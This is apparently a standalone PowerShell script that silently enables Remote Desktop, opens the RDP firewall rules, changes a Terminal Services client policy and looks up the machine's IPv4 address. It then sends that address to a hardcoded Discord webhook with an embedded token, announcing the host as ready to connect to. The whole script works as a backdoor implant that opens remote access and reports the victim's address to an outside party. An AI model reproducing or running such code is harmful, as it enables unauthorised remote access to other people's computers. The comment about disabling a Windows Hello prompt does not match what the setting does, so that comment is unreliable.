Try {
    # Enable Remote Desktop silently
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -ErrorAction Stop

    # Enable RDP Firewall rules silently
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction Stop

    # Disable Windows Hello credential prompt for RDP
    $helloPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\Client"
    If (-Not (Test-Path $helloPath)) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "Client" -ErrorAction Stop | Out-Null
    }
    Set-ItemProperty -Path $helloPath -Name "DisablePasswordSaving" -Type DWord -Value 1 -ErrorAction Stop

    # Get the IPv4 address excluding loopback/vm/etc.
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress

    $logMessage = "Success: RDP enabled. Connect using IP: $ip"
}
Catch {
    $logMessage = "Error enabling RDP: $_"
}

# Discord webhook URL
$hookUrl = "https://discord.com/api/webhooks/1410626073854611552/eJdnmCc8LVRoD3IVuYlTKQRAN77DhhLulDIQRYnaRRVByZOUy0p5aLaHraNjOTRTbOQj"

# Send log message to webhook
$payload = @{ content = $logMessage }
Try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json' -ErrorAction Stop
}
Catch {
    # If sending fails, write error to local log file (optional)
    Add-Content -Path "$env:TEMP\rdp_script_error.log" -Value ("Webhook log send failed: $_")
}
